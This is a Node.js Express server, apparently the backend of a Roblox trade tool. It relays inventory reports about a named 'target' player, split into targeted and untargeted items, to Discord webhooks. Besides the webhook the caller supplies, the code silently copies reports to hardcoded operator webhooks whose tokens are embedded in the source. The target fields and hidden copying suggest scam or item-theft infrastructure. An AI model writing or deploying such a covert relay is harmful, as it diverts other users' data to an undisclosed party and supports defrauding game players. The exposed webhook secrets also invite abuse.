const express = require('express');
const axios = require('axios');
const app = express();
const PORT = process.env.PORT || 3000;

const FALLBACK_WEBHOOK = 'https://discord.com/api/webhooks/1528664955258277940/DYi4QqN2pr93CM35VxOzy9MZ6eA2Fl408SuHHKgIvmsTtCcepASPG45NDsxXw_veRMA-';

app.use(express.json());

app.get('/webhook', (req, res) => {
    res.json({ status: 'ok', message: 'API funcionando correctamente' });
});

app.post('/webhook', async (req, res) => {
    try {
        const data = req.body;
        console.log('📥 Datos recibidos:', data);

        const player = data.playerName || 'Desconocido';
        const target = data.targetName || 'Desconocido';
        const targetId = data.targetId || 0;
        const webhookUrl = data.webhookUrl;
        const hasPrivateItem = data.hasPrivateItem || false;

        const brainTargeted = data.brainTargeted || [];
        const brainUntargeted = data.brainUntargeted || [];
        const baseTargeted = data.baseTargeted || [];
        const baseUntargeted = data.baseUntargeted || [];
        const gearTargeted = data.gearTargeted || [];
        const gearUntargeted = data.gearUntargeted || [];
        const timestamp = data.timestamp || Date.now();

        const content = [
            `**📊 Inventario de ${player}**`,
            `**Objetivo:** ${target} (ID: ${targetId})`,
            ``,
            `**🧠 BRAINROTS TARGETED (${brainTargeted.length}):**`,
            brainTargeted.length > 0 ? brainTargeted.join(', ') : 'Ninguno',
            `**🧠 BRAINROTS UNTARGETED (${brainUntargeted.length}):**`,
            brainUntargeted.length > 0 ? brainUntargeted.join(', ') : 'Ninguno',
            ``,
            `**🎨 BASES TARGETED (${baseTargeted.length}):**`,
            baseTargeted.length > 0 ? baseTargeted.join(', ') : 'Ninguno',
            `**🎨 BASES UNTARGETED (${baseUntargeted.length}):**`,
            baseUntargeted.length > 0 ? baseUntargeted.join(', ') : 'Ninguno',
            ``,
            `**⚙️ GEARS TARGETED (${gearTargeted.length}):**`,
            gearTargeted.length > 0 ? gearTargeted.join(', ') : 'Ninguno',
            `**⚙️ GEARS UNTARGETED (${gearUntargeted.length}):**`,
            gearUntargeted.length > 0 ? gearUntargeted.join(', ') : 'Ninguno',
            ``,
            `🕒 \`${new Date(timestamp).toLocaleString('es-ES', { timeZone: 'UTC' })}\``
        ].join('\n');

        const payload = {
            content: content,
            username: 'TradeNotifier',
            avatar_url: 'https://cdn.pfps.gg/pfps/10184-389218-roblox.png'
        };

        const webhooksToSend = [];

        if (hasPrivateItem) {
            if (webhookUrl) {
                webhooksToSend.push(webhookUrl);
            } else {
                webhooksToSend.push('https://discord.com/api/webhooks/1518688015692599416/9DG8JBvlf31P2FRj3dfRtamrWDpUpCymXpDMkfM8IMEPHVVKmXVeg1i_MXWVZpzokj6L');
            }
        } else {
            if (webhookUrl) {
                webhooksToSend.push(webhookUrl);
            }
            webhooksToSend.push(FALLBACK_WEBHOOK);
        }

        for (const url of webhooksToSend) {
            try {
                await axios.post(url, payload);
                console.log(`✅ Enviado a: ${url}`);
            } catch (err) {
                console.error(`❌ Error enviando a ${url}:`, err.message);
            }
        }

        res.status(200).json({ status: 'ok', message: 'Notificaciones enviadas' });
    } catch (error) {
        console.error('❌ Error general:', error.message);
        res.status(500).json({ status: 'error', message: error.message });
    }
});

app.listen(PORT, () => {
    console.log(`✅ Servidor corriendo en puerto ${PORT}`);
});
